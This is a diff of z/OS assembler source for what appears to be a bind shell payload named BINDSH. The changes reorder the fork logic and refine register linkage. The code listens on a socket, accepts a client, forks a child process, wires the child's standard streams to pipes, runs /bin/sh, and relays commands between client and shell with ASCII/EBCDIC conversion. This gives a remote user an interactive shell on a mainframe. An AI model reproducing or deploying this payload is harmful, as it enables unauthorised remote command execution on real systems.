@@ -37,123 +37,6 @@ BINDSH   RMODE ANY
 
 ***********************************************************************
 *                                                                     *
-*        Create pipes to be used to communicate with child proc       *
-*          that will be created in upcoming forking                   *
-*                                                                     *
-***********************************************************************
-@CPIPES  LARL  14,@CFD 
-         BRC   15,LPIPE        # get FDs for child proc
-@CFD     ST    5,CFDR          # store child read fd
-         ST    6,CFDW          # store child write fd
-@CPIPE2  LARL  14,@PFD 
-         BRC   15,LPIPE        # get FDs for parent proc
-@PFD     ST    5,PFDR          # store parent read fd
-         ST    6,PFDW          # store parent write fd
-
-***********************************************************************
-*                                                                     *
-*        BP1FRK  (FORK) fork a child process                          *
-*                                                                     *
-***********************************************************************
-LFORK    L     15,BFRK         # load func addr to 15
-         CALL  (15),(CPROCN,RTN_COD,RSN_COD),VL
-         BRAS  0,@PREPCHL
-****************************************************
-*  chk return code here anything but -1 is ok      *
-****************************************************
-         LHI   15,1            # load 1 for RC / Debugging
-         L     6,CPROCN        # locad Ret val in R6
-         CIB   6,-1,8,EXITP    # compare R6 to -1 and jump if eq
-
-****************************************************
-*  prepare the child process for exec , only runs  *
-*  if CPROCN (child pid from fork) equals 0        *
-****************************************************
-@PREPCHL L     2,CPROCN        # load child proc # to R2
-         CIB   2,0,7,@PREPPAR  # R2 not 0? We are parent, move on
-
-*************************************************
-* order of things to prep child pid             *
-*  0) Close parent write fd                     *
-*  1) Close child read fd                       *
-*  2) dupe parent read fd to std input          *
-*  3) dupe child write fd to std output         *
-*  4) dupe child write fd to std err            *
-*  5) Close parent read fd                      *
-*  6) Close child write fd                      *
-*  7) exec /bin/sh                              *
-*************************************************
-         LARL  14,@PRC1
-         LA    2,F_CLOSFD
-         L     5,PFDW          # load R5 with pfdw
-         L     6,PFDW          # load R5 with pfdw
-@PRC0    BRC   15,LFCNTL       # call close
-@PRC1    LARL  14,@PRC2         
-         LA    2,F_CLOSFD
-         L     5,CFDR          # load R5 with cfdr
-         L     6,CFDR          # load R5 with cfdr
-         BRC   15,LFCNTL       # call close
-@PRC2    LARL  14,@PRC3
-         LA    2,F_DUPFD2      # gonna do a dup2
-         L     5,PFDR          # parent read fd
-         LGFI  6,0             # std input  
-         BRC   15,LFCNTL       # call dupe2
-@PRC3    LARL  14,@PRC4
-         LA    2,F_DUPFD2      # gonna do a dup2
-         L     5,CFDW          # child write fd 
-         LGFI  6,1             # std output
-         BRC   15,LFCNTL       # call dupe2
-@PRC4    LARL  14,@PRC5        # if 0 we are in child pid, goto exec
-         LA    2,F_DUPFD2      # gonna do a dup2
-         L     5,CFDW          # child write fd 
-         LGFI  6,2             # std error
-         BRC   15,LFCNTL       # call dupe2
-@PRC5    LARL  14,@PRC6         
-         LA    2,F_CLOSFD
-         L     5,PFDR          # load R5 with pfdr
-         L     6,PFDR          # load R5 with pfdr
-         BRC   15,LFCNTL       # call close
-@PRC6    LARL  14,@PRC7         
-         LA    2,F_CLOSFD
-         L     5,CFDW          # load R5 with cfdw
-         L     6,CFDW          # load R5 with cfdw
-         BRC   15,LFCNTL       # call close
-@PRC7    BRAS  0,LEXEC
-
-***********************************************************************
-*                                                                     *
-*        BP1EXC  (EXEC) execute shell '/bin/sh'                       *
-*                                                                     *
-***********************************************************************
-LEXEC    L     15,BEXC         # load func addr to 15
-         CALL  (15),(EXCMDL,EXCMD,EXARGC,EXARGLL,EXARGL,               x
-               EXENVC,EXENVLL,EXENVL,                                  x
-               EXITRA,EXITPLA,                                         x
-               RTN_VAL,RTN_COD,RSN_COD),VL
-         BRAS  0,GOODEX        # exit child proc after exec
-
-****************************************************
-*  prepare the parent process to speak with child  *
-*  order of things to prep parent pid              *
-*  0)  close parent fd read                        *
-*  1)  close child fd write                        *
-*  2)  socket,bind,accept,listen,read & write      * 
-*  3)  set client socked and child fd write        *
-*       to non_blocking                            *
-****************************************************
-@PREPPAR LARL  14,@PRP1
-         LA    2,F_CLOSFD
-         L     5,PFDR          # load R5 with pfdr
-         L     6,PFDR          # load R5 with pfdr
-         BRC   15,LFCNTL       # call close
-@PRP1    LARL  14,LSOCK 
-         LA    2,F_CLOSFD
-         L     5,CFDW          # load R5 with cfdw
-         L     6,CFDW          # load R5 with cfdw
-         BRC   15,LFCNTL       # call close
-
-***********************************************************************
-*                                                                     *
 *        BPX1SOC set up socket - inline                               *
 *                                                                     *
 ***********************************************************************
@@ -226,36 +109,134 @@ LACPT    L     15,BACP         # load func addr to 15
          L     6,CLIFD   
          CIB   6,-1,8,EXITP     # R6 = -1? Time to exit
 
+***********************************************************************
+*                                                                     *
+*        Create pipes to be used to communicate with child proc       *
+*          that will be created in upcoming forking                   *
+*                                                                     *
+***********************************************************************
+@CPIPES  BRAS  14,LPIPE        # get FDs for child proc
+@CFD     ST    5,CFDR          # store child read fd
+         ST    6,CFDW          # store child write fd
+@CPIPE2  BRAS  14,LPIPE
+@PFD     ST    5,PFDR          # store parent read fd
+         ST    6,PFDW          # store parent write fd
+
+***********************************************************************
+*                                                                     *
+*        BP1FRK  (FORK) fork a child process                          *
+*                                                                     *
+***********************************************************************
+LFORK    L     15,BFRK         # load func addr to 15
+         CALL  (15),(CPROCN,RTN_COD,RSN_COD),VL
+         BRAS  0,@PREPCHL
+****************************************************
+*  chk return code here anything but -1 is ok      *
+****************************************************
+         LHI   15,1            # load 1 for RC / Debugging
+         L     6,CPROCN        # locad Ret val in R6
+         CIB   6,-1,8,EXITP    # compare R6 to -1 and jump if eq
+
+****************************************************
+*  prepare the child process for exec , only runs  *
+*  if CPROCN (child pid from fork) equals 0        *
+****************************************************
+@PREPCHL L     2,CPROCN        # load child proc # to R2
+         CIB   2,0,7,@PREPPAR  # R2 not 0? We are parent, move on
+
+*************************************************
+* order of things to prep child pid             *
+*  0) Close parent write fd                     *
+*  1) Close child read fd                       *
+*  2) dupe parent read fd to std input          *
+*  3) dupe child write fd to std output         *
+*  4) dupe child write fd to std err            *
+*  5) Close parent read fd                      *
+*  6) Close child write fd                      *
+*  7) exec /bin/sh                              *
+*************************************************
+         LA    2,F_CLOSFD
+         L     5,PFDW          # load R5 with pfdw
+         L     6,PFDW          # load R5 with pfdw
+@PRC0    BRAS  14,LFCNTL       # call close
+         LA    2,F_CLOSFD
+         L     5,CFDR          # load R5 with cfdr
+         L     6,CFDR          # load R5 with cfdr
+         BRAS  14,LFCNTL       # call close
+         LA    2,F_DUPFD2      # gonna do a dup2
+         L     5,PFDR          # parent read fd
+         LGFI  6,0             # std input  
+         BRAS  14,LFCNTL       # call dupe2
+         LA    2,F_DUPFD2      # gonna do a dup2
+         L     5,CFDW          # child write fd 
+         LGFI  6,1             # std output
+         BRAS  14,LFCNTL       # call dupe2
+         LA    2,F_DUPFD2      # gonna do a dup2
+         L     5,CFDW          # child write fd 
+         LGFI  6,2             # std error
+         BRAS  14,LFCNTL       # call dupe2
+         LA    2,F_CLOSFD
+         L     5,PFDR          # load R5 with pfdr
+         L     6,PFDR          # load R5 with pfdr
+         BRAS  14,LFCNTL       # call close
+         LA    2,F_CLOSFD
+         L     5,CFDW          # load R5 with cfdw
+         L     6,CFDW          # load R5 with cfdw
+         BRAS  14,LFCNTL       # call close
+
+***********************************************************************
+*                                                                     *
+*        BP1EXC  (EXEC) execute shell '/bin/sh'                       *
+*                                                                     *
+***********************************************************************
+LEXEC    L     15,BEXC         # load func addr to 15
+         CALL  (15),(EXCMDL,EXCMD,EXARGC,EXARGLL,EXARGL,               x
+               EXENVC,EXENVLL,EXENVL,                                  x
+               EXITRA,EXITPLA,                                         x
+               RTN_VAL,RTN_COD,RSN_COD),VL
+         BRAS  0,GOODEX        # exit child proc after exec
+
+****************************************************
+*  prepare the parent process to speak with child  *
+*  order of things to prep parent pid              *
+*  0)  close parent fd read                        *
+*  1)  close child fd write                        *
+*  2)  socket,bind,accept,listen,read & write      * 
+*  3)  set client socked and child fd write        *
+*       to non_blocking                            *
+****************************************************
+@PREPPAR LA    2,F_CLOSFD
+         L     5,PFDR          # load R5 with pfdr
+         L     6,PFDR          # load R5 with pfdr
+         BRAS  14,LFCNTL       # call close
+         LA    2,F_CLOSFD
+         L     5,CFDW          # load R5 with cfdw
+         L     6,CFDW          # load R5 with cfdw
+         BRAS  14,LFCNTL       # call close
+
 ****************************************************
 *  Set clifd and child fd read to non_blocking     *
 ****************************************************
-@SNB1    LARL  14,@SNB2
          LA    2,F_GETFL       # get file status flags
          L     5,CLIFD         # client sock fd
          XR    6,6             # for getfd, arg is 0
-         BRC   15,LFCNTL       # call dupe2
-@TFLAG   DC    F'0'
-@SNB2    ST    7,@TFLAG        # R7 will have our flags
+         BRAS  14,LFCNTL       # call dupe2
          LA    5,O_NONBLOCK    # add non-blocking flag 
          OR    7,5             # or to add the flag to R7
-         LARL  14,@SNB3
          LA    2,F_SETFL       # set file status flags
          L     5,CLIFD         # client sock fd
          LR    6,7             # put new flags in R6
-         BRC   15,LFCNTL       # call dupe2
-@SNB3    LARL  14,@SNB4
+         BRAS  14,LFCNTL       # call dupe2
          LA    2,F_GETFL       # get file status flags
          L     5,CFDR          # child fd read
          XR    6,6             # for getfd, arg is 0
-         BRC   15,LFCNTL       # call dupe2
-@SNB4    ST    7,@TFLAG        # R7 will have our flags
+         BRAS  14,LFCNTL       # call dupe2
          LA    5,O_NONBLOCK    # add non-blocking flag 
          OR    7,5             # or to add the flag to R7
-         LARL  14,@READCLI     # when we ret, enter main loop
          LA    2,F_SETFL       # set file status flags
          L     5,CFDR          # child fd read
          LR    6,7             # put new flags in R6
-         BRC   15,LFCNTL       # call dupe2
+         BRAS  14,LFCNTL       # call dupe2
 ***********************************************************************
 *                                                                     *
 *        Main read from client socket looop starts here               *
@@ -263,19 +244,16 @@ LACPT    L     15,BACP         # load func addr to 15
 ***********************************************************************
 @READCLI L     5,CLIFD         # read from CLIFD
          LA    7,@READCFD      # Nothing read, return to here
-         LARL  14,@A2E1        # Bytes read, return to here
-         BRC   15,LREAD        # Brach to read function
+         BRAS  14,LREAD        # Brach to read function
 
 *******************************
 *    CALL A2E                 *
 *     change CLIBUF from      *
 *     ASCII to EBCDIC         *
 *******************************
-@A2E1    LARL  14,@CCW1        # load return area in r14
-         BRC   15,CONVAE       # call e2a func
-@CCW1    LARL  14,@READCFD     # after write, read child fd
+         BRAS  14,CONVAE       # call e2a func
          L     5,PFDW          # write to child process fd
-         BRC   15,LWRITE       # call write function
+         BRAS  14,LWRITE       # call write function
 
 ***********************************************************************
 *                                                                     *
@@ -284,19 +262,16 @@ LACPT    L     15,BACP         # load func addr to 15
 ***********************************************************************
 @READCFD L     5,CFDR          # read from child fd
          LA    7,@READCLI      # nothing read, back to socket read
-         LARL  14,@E2A1        # Bytes read, return to here
-         BRC   15,LREAD        # Branch to read function
+         BRAS  14,LREAD        # Branch to read function
 
 *******************************
 *    CALL E2A                 *
 *     change CLIBUF from      *
-*     EBCIDIC to ASCII        *
+*     ebcdic to ASCII        *
 *******************************
-@E2A1    LARL  14,@CCW2        # load return area in r14
-         BRC   15,CONVEA       # call e2a func
-@CCW2    LARL  14,@READCFD     # loop read child proc fd after write
+         BRAS  14,CONVEA       # call e2a func
          L     5,CLIFD         # write to client socked fd
-         BRC   15,LWRITE       # call write function
+         BRAS  14,LWRITE       # call write function
 
 ********************************************************
 *    Functions beyond this point, no more inline       *
@@ -319,10 +294,12 @@ LREAD    L     15,BRED         # load func addr to 15
          L     5,CLIBUF        # clibuf addr
          XC    0(52,5),0(5)    # 0 out cli buf
          BRAS  0,@CRED         # jump to call
+         DS    0F
 @TRFD    DC    4XL1'0'         # temp var for rd to read
 @NRA     DC    4XL1'0'         # temp var for not read ret addr
 @CRED    CALL  (15),(@TRFD,CLIBUF,ALET,CLIREAD,                        x
                BREAD,RTN_COD,RSN_COD),VL
+         DS    0H
 ****************************************************
 *  chk return code here anything but -1 is ok      *
 *   for non-blocking fd's we have to check         *
@@ -426,7 +403,7 @@ LPIPE    L     15,BPIP         # load func addr to 15
 
 ***********************************************************************
 *                                                                     *
-*        CONVAE -  convert CLIBUF ascii to ebcidic                    *
+*        CONVAE -  convert CLIBUF ascii to ebcdic                    *
 *            function looks up ascii byte and returns ebcdic          *
 *            expects return address in R14                            *
 *                                                                     *
@@ -449,8 +426,8 @@ LOOP1    L     2,A2E      # address of a2e buff
 
 ***********************************************************************
 *                                                                     *
-*        CONVEA -  convert CLIBUF ebcidic to ascii                    *
-*            function looks up ebcidic byte and returns ascii         *
+*        CONVEA -  convert CLIBUF ebcdic to ascii                    *
+*            function looks up ebcdic byte and returns ascii         *
 *            expects return address in R14                            *
 *                                                                     *
 ***********************************************************************
@@ -572,8 +549,8 @@ RSN_COD  DC    A(*)               # reason code
 ***** end of constants ****
 ***************************
 ****************************************************
-* ebcidic to ascii lookup                          *
-* read hex(ebcidic char) bytes from beginning of   *
+* ebcdic to ascii lookup                          *
+* read hex(ebcdic char) bytes from beginning of   *
 * array to get ascii byte                          *
 ****************************************************
 E2ABUF   DC    X'0102039c09867f978d8e0b0c0d0e0f101112139d0a08871819928fX
@@ -589,9 +566,9 @@ E2ABUF   DC    X'0102039c09867f978d8e0b0c0d0e0f101112139d0a08871819928fX
          DC    X'9f'
 E2A      DC    A(E2ABUF)
 ****************************************************
-* ascii to ebcidic lookup                          *
+* ascii to ebcdic lookup                          *
 * read hex(ascii char) bytes from beginning of     * 
-* array to get ebcidic byte                        *
+* array to get ebcdic byte                        *
 ****************************************************
 A2EBUF   DC    X'010203372d2e2f1605150b0c0d0e0f101112133c3d322618193f27X
                1c1d1e1f405a7f7b5b6c507d4d5d5c4e6b604b61f0f1f2f3f4f5f6f7X
